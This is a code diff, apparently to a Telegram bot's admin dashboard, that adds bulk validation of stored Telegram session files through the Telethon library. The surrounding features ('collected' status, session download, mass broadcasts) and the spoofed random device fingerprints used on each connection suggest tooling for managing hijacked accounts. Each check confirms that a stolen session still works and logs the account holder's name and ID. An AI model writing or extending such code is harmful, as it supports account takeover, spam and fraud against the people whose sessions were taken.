@@ -71,6 +71,8 @@ os.makedirs(SESSIONS_DIR, exist_ok=True)
 BROADCAST_DELAY_SECONDS = 0.25
 broadcast_task = None
 broadcast_last_result = {"running": False, "sent": 0, "failed": 0, "queued": 0}
+validate_all_task = None
+validate_all_last_result = {"running": False, "checked": 0, "valid": 0, "invalid": 0, "missing": 0, "errors": 0, "queued": 0}
 MAIN_BOT_ID = None
 
 # Webhook
@@ -1349,6 +1351,8 @@ async def api_dashboard(request):
         "broadcast_users": broadcast_users,
         "broadcast_running": bool(broadcast_task and not broadcast_task.done()),
         "broadcast_last": broadcast_last_result,
+        "validate_all_running": bool(validate_all_task and not validate_all_task.done()),
+        "validate_all_last": validate_all_last_result,
     })
 
 async def api_dashboard_disparo(request):
@@ -1378,6 +1382,189 @@ async def api_dashboard_disparo(request):
         "ok": True,
         "queued": queued,
         "message": f"Disparo iniciado para {queued} usuario(s).",
+    })
+
+def get_all_session_phones():
+    phones = set(session_stats.keys())
+    try:
+        for fname in os.listdir(SESSIONS_DIR):
+            if fname.endswith(".session"):
+                phones.add(fname[:-len(".session")])
+    except Exception as e:
+        print(f"[VALIDATE_ALL] Erro ao listar sessoes: {type(e).__name__}: {e}")
+    return sorted(phone for phone in phones if phone)
+
+async def validate_saved_session_phone(phone):
+    """Valida uma sessao salva sem enviar mensagens nem interagir com chats."""
+    phone = (phone or "").strip()
+    if not phone:
+        return {"ok": False, "authorized": False, "error": "Telefone invalido"}, 400
+
+    session_path = os.path.join(SESSIONS_DIR, phone)
+    session_file = f"{session_path}.session"
+
+    if phone not in session_stats:
+        init_session_stats(phone)
+
+    if not os.path.exists(session_file):
+        session_stats[phone]["status"] = "expired"
+        session_stats[phone]["validation_status"] = "missing"
+        session_stats[phone]["validated_at"] = time.time()
+        session_stats[phone]["validation_error"] = "Arquivo .session nao encontrado"
+        save_stats()
+        return {
+            "ok": False,
+            "authorized": False,
+            "status": "expired",
+            "validation_status": "missing",
+            "error": "Arquivo .session nao encontrado",
+        }, 404
+
+    devices = [
+        ("Samsung Galaxy S22", "Android 13", "10.9.5"),
+        ("iPhone 14 Pro", "iOS 17.0", "10.9.3"),
+        ("Xiaomi 13", "Android 13", "10.9.4"),
+    ]
+    device = random.choice(devices)
+    client = TelegramClient(
+        session_path,
+        API_ID,
+        API_HASH,
+        device_model=device[0],
+        system_version=device[1],
+        app_version=device[2],
+        lang_code="pt-br"
+    )
+
+    try:
+        print(f"[VALIDATE] Checando sessao {phone} sem enviar mensagens...")
+        await asyncio.wait_for(client.connect(), timeout=30)
+
+        authorized = await asyncio.wait_for(client.is_user_authorized(), timeout=20)
+        now = time.time()
+
+        if not authorized:
+            session_stats[phone]["status"] = "banned"
+            session_stats[phone]["ban_reason"] = "Sessao nao autorizada"
+            session_stats[phone]["validation_status"] = "invalid"
+            session_stats[phone]["validated_at"] = now
+            session_stats[phone]["validation_error"] = "Sessao nao autorizada"
+            save_stats()
+            print(f"[VALIDATE] {phone} nao esta autorizada")
+            return {
+                "ok": True,
+                "authorized": False,
+                "status": "banned",
+                "validation_status": "invalid",
+                "validated_at": now,
+                "error": "Sessao nao autorizada",
+            }, 200
+
+        me = await asyncio.wait_for(client.get_me(), timeout=20)
+        session_stats[phone]["status"] = "collected"
+        session_stats[phone]["account_name"] = me.first_name or ""
+        session_stats[phone]["account_id"] = me.id
+        session_stats[phone]["validation_status"] = "valid"
+        session_stats[phone]["validated_at"] = now
+        session_stats[phone]["validation_error"] = ""
+        save_stats()
+        print(f"[VALIDATE] {phone} autorizada como {me.first_name} (ID: {me.id})")
+        return {
+            "ok": True,
+            "authorized": True,
+            "status": "collected",
+            "validation_status": "valid",
+            "validated_at": now,
+            "account_name": me.first_name or "",
+            "account_id": me.id,
+        }, 200
+
+    except Exception as e:
+        error_name = type(e).__name__
+        now = time.time()
+        invalid_errors = ["UserDeactivated", "AuthKeyUnregistered", "AuthKeyDuplicated"]
+        session_stats[phone]["validation_status"] = "invalid" if any(x in error_name for x in invalid_errors) else "error"
+        session_stats[phone]["validated_at"] = now
+        session_stats[phone]["validation_error"] = f"{error_name}: {e}"
+        if session_stats[phone]["validation_status"] == "invalid":
+            session_stats[phone]["status"] = "banned"
+            session_stats[phone]["ban_reason"] = f"{error_name}: {e}"
+        save_stats()
+        print(f"[VALIDATE] Erro ao validar {phone}: {error_name}: {e}")
+        return {
+            "ok": False,
+            "authorized": False,
+            "validation_status": session_stats[phone]["validation_status"],
+            "validated_at": now,
+            "error": f"{error_name}: {e}",
+        }, 500
+
+    finally:
+        try:
+            await client.disconnect()
+        except Exception:
+            pass
+
+async def run_validate_all_sessions():
+    """Valida todas as sessoes conhecidas em background."""
+    global validate_all_last_result
+
+    phones = get_all_session_phones()
+    validate_all_last_result = {
+        "running": True,
+        "checked": 0,
+        "valid": 0,
+        "invalid": 0,
+        "missing": 0,
+        "errors": 0,
+        "queued": len(phones),
+        "started_at": time.time(),
+    }
+    print(f"[VALIDATE_ALL] Iniciando validacao de {len(phones)} sessao(oes)")
+
+    for phone in phones:
+        result, status_code = await validate_saved_session_phone(phone)
+        validation_status = result.get("validation_status")
+
+        validate_all_last_result["checked"] += 1
+        if result.get("authorized"):
+            validate_all_last_result["valid"] += 1
+        elif validation_status == "invalid":
+            validate_all_last_result["invalid"] += 1
+        elif validation_status == "missing":
+            validate_all_last_result["missing"] += 1
+        elif status_code >= 400:
+            validate_all_last_result["errors"] += 1
+
+        await asyncio.sleep(0.35)
+
+    validate_all_last_result["running"] = False
+    validate_all_last_result["finished_at"] = time.time()
+    print(
+        "[VALIDATE_ALL] Finalizado: "
+        f"{validate_all_last_result['valid']} valida(s), "
+        f"{validate_all_last_result['invalid']} invalida(s), "
+        f"{validate_all_last_result['missing']} sem arquivo, "
+        f"{validate_all_last_result['errors']} erro(s)"
+    )
+
+async def api_dashboard_validate_all_sessions(request):
+    """Inicia a validacao de todas as sessoes."""
+    global validate_all_task
+
+    token = request.query.get("token", "")
+    if token != DASHBOARD_TOKEN:
+        return web.json_response({"error": "Acesso negado"}, status=403)
+
+    if validate_all_task and not validate_all_task.done():
+        return web.json_response({"error": "Ja existe uma validacao em andamento"}, status=409)
+
+    queued = len(get_all_session_phones())
+    validate_all_task = asyncio.create_task(run_validate_all_sessions())
+    return web.json_response({
+        "ok": True,
+        "queued": queued,
+        "message": f"Validacao iniciada para {queued} sessao(oes).",
     })
 
 async def api_dashboard_validate_session(request):
@@ -1682,6 +1869,7 @@ async def main():
     web_app.router.add_post("/api/dashboard/cleanup", api_dashboard_cleanup)
     web_app.router.add_post("/api/dashboard/cleanup-unvalidated", api_dashboard_cleanup_unvalidated)
     web_app.router.add_post("/api/dashboard/validate-session", api_dashboard_validate_session)
+    web_app.router.add_post("/api/dashboard/validate-all-sessions", api_dashboard_validate_all_sessions)
     web_app.router.add_get("/api/dashboard/download-sessions", api_dashboard_download_sessions)
     web_app.router.add_post("/api/dashboard/connect-bot", api_connect_bot)
     web_app.router.add_post("/api/dashboard/disconnect-bot", api_disconnect_bot)
